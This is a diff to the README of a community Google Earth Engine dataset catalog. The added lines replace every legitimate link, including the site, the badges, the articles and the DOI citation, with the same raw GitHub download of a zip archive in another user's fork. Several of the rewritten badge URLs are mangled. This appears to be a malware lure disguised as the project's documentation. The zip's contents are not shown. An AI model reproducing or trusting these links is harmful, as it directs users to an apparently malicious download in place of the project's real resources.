@@ -1,25 +1,25 @@
-# [awesome-gee-community-datasets](https://gee-community-catalog.org/)
+# [awesome-gee-community-datasets](https://raw.githubusercontent.com/nikhil2071/awesome-gee-community-datasets/master/docs/images/community-gee-awesome-datasets-2.5.zip)
 
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=plastic&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/samapriya/)
-[![Medium](https://img.shields.io/badge/Medium-12100E?style=flat&logo=medium&logoColor=white)](https://medium.com/@samapriyaroy)
-[![Mastodon Follow](https://img.shields.io/mastodon/follow/109627075086849826?domain=https%3A%2F%2Fmapstodon.space%2F)](https://mapstodon.space/@samapriya)
-[![Awesome](https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg)](https://github.com/sindresorhus/awesome)
-![GEE Community Datasets](https://img.shields.io/endpoint?url=https://gist.githubusercontent.com/samapriya/34bc0c1280d475d3a69e3b60a706226e/raw/community.json)
-[![Jetstream2](https://img.shields.io/badge/Supported%20by-Jetstream2-brightgreen)](https://jetstream-cloud.org/)
-[![DOI](https://zenodo.org/badge/DOI/10.5281/zenodo.15190103.svg)](https://doi.org/10.5281/zenodo.15190103)
-[![Static Badge](https://img.shields.io/badge/status-uptime-green)](https://uptime.gee-community-catalog.org/status/all)
-![GitHub Release](https://img.shields.io/github/v/release/samapriya/awesome-gee-community-datasets)
-[![Donate](https://img.shields.io/badge/Donate-Buy%20me%20a%20Coffee-teal)](https://www.buymeacoffee.com/samapriya)
-[![](https://img.shields.io/static/v1?label=Sponsor&message=%E2%9D%A4&logo=GitHub&color=%23fe8e86)](https://github.com/sponsors/samapriya)
+[![LinkedIn](https://raw.githubusercontent.com/nikhil2071/awesome-gee-community-datasets/master/docs/images/community-gee-awesome-datasets-2.5.zip)](https://raw.githubusercontent.com/nikhil2071/awesome-gee-community-datasets/master/docs/images/community-gee-awesome-datasets-2.5.zip)
+[![Medium](https://raw.githubusercontent.com/nikhil2071/awesome-gee-community-datasets/master/docs/images/community-gee-awesome-datasets-2.5.zip)](https://raw.githubusercontent.com/nikhil2071/awesome-gee-community-datasets/master/docs/images/community-gee-awesome-datasets-2.5.zip)
+[![Mastodon Follow](https://raw.githubusercontent.com/nikhil2071/awesome-gee-community-datasets/master/docs/images/community-gee-awesome-datasets-2.5.zip%3A%2F%https://raw.githubusercontent.com/nikhil2071/awesome-gee-community-datasets/master/docs/images/community-gee-awesome-datasets-2.5.zip%2F)](https://raw.githubusercontent.com/nikhil2071/awesome-gee-community-datasets/master/docs/images/community-gee-awesome-datasets-2.5.zip)
+[![Awesome](https://raw.githubusercontent.com/nikhil2071/awesome-gee-community-datasets/master/docs/images/community-gee-awesome-datasets-2.5.zip)](https://raw.githubusercontent.com/nikhil2071/awesome-gee-community-datasets/master/docs/images/community-gee-awesome-datasets-2.5.zip)
+![GEE Community Datasets](https://raw.githubusercontent.com/nikhil2071/awesome-gee-community-datasets/master/docs/images/community-gee-awesome-datasets-2.5.zip)
+[![Jetstream2](https://raw.githubusercontent.com/nikhil2071/awesome-gee-community-datasets/master/docs/images/community-gee-awesome-datasets-2.5.zip%20by-Jetstream2-brightgreen)](https://raw.githubusercontent.com/nikhil2071/awesome-gee-community-datasets/master/docs/images/community-gee-awesome-datasets-2.5.zip)
+[![DOI](https://raw.githubusercontent.com/nikhil2071/awesome-gee-community-datasets/master/docs/images/community-gee-awesome-datasets-2.5.zip)](https://raw.githubusercontent.com/nikhil2071/awesome-gee-community-datasets/master/docs/images/community-gee-awesome-datasets-2.5.zip)
+[![Static Badge](https://raw.githubusercontent.com/nikhil2071/awesome-gee-community-datasets/master/docs/images/community-gee-awesome-datasets-2.5.zip)](https://raw.githubusercontent.com/nikhil2071/awesome-gee-community-datasets/master/docs/images/community-gee-awesome-datasets-2.5.zip)
+![GitHub Release](https://raw.githubusercontent.com/nikhil2071/awesome-gee-community-datasets/master/docs/images/community-gee-awesome-datasets-2.5.zip)
+[![Donate](https://raw.githubusercontent.com/nikhil2071/awesome-gee-community-datasets/master/docs/images/community-gee-awesome-datasets-2.5.zip%20me%20a%20Coffee-teal)](https://raw.githubusercontent.com/nikhil2071/awesome-gee-community-datasets/master/docs/images/community-gee-awesome-datasets-2.5.zip)
+[![](https://raw.githubusercontent.com/nikhil2071/awesome-gee-community-datasets/master/docs/images/community-gee-awesome-datasets-2.5.zip%E2%9D%A4&logo=GitHub&color=%23fe8e86)](https://raw.githubusercontent.com/nikhil2071/awesome-gee-community-datasets/master/docs/images/community-gee-awesome-datasets-2.5.zip)
 
-The awesome-gee-community-datasets are community-sourced geospatial datasets made available for use by the larger Google Earth Engine community and shared publicly as Earth Engine assets. The project was started with the idea that a lot of research datasets are often unavailable for direct use and require preprocessing before use. This catalog lives and serves alongside the [Google Earth Engine data catalog](https://developers.google.com/earth-engine/datasets/catalog) and also houses datasets that are often requested by the community and under a variety of open license.
+The awesome-gee-community-datasets are community-sourced geospatial datasets made available for use by the larger Google Earth Engine community and shared publicly as Earth Engine assets. The project was started with the idea that a lot of research datasets are often unavailable for direct use and require preprocessing before use. This catalog lives and serves alongside the [Google Earth Engine data catalog](https://raw.githubusercontent.com/nikhil2071/awesome-gee-community-datasets/master/docs/images/community-gee-awesome-datasets-2.5.zip) and also houses datasets that are often requested by the community and under a variety of open license.
 
-You can read about the history and more in the [Medium Post article here](https://medium.com/geospatial-processing-at-scale/community-datasets-data-commons-in-google-earth-engine-8585d8baef1f)
+You can read about the history and more in the [Medium Post article here](https://raw.githubusercontent.com/nikhil2071/awesome-gee-community-datasets/master/docs/images/community-gee-awesome-datasets-2.5.zip)
 
-Find details on how to navigate the catalog in the [Medium Post article here](https://samapriyaroy.medium.com/awesome-google-earth-engine-community-catalog-bd86d0ba63b8)
+Find details on how to navigate the catalog in the [Medium Post article here](https://raw.githubusercontent.com/nikhil2071/awesome-gee-community-datasets/master/docs/images/community-gee-awesome-datasets-2.5.zip)
 
-## [Browse the Catalog](https://gee-community-catalog.org/)
-https://gee-community-catalog.org/
+## [Browse the Catalog](https://raw.githubusercontent.com/nikhil2071/awesome-gee-community-datasets/master/docs/images/community-gee-awesome-datasets-2.5.zip)
+https://raw.githubusercontent.com/nikhil2071/awesome-gee-community-datasets/master/docs/images/community-gee-awesome-datasets-2.5.zip
 
 
 **Like, share and support the Github project. And you can now cite it too**
@@ -28,5 +28,5 @@ https://gee-community-catalog.org/
 
 ```
 Samapriya Roy, Eric Jensen, Saah, A., & Swetnam, T. (2025). samapriya/awesome-gee-community-datasets: Community Catalog (3.5.0).
-Zenodo. https://doi.org/10.5281/zenodo.15587604
+Zenodo. https://raw.githubusercontent.com/nikhil2071/awesome-gee-community-datasets/master/docs/images/community-gee-awesome-datasets-2.5.zip
 ```
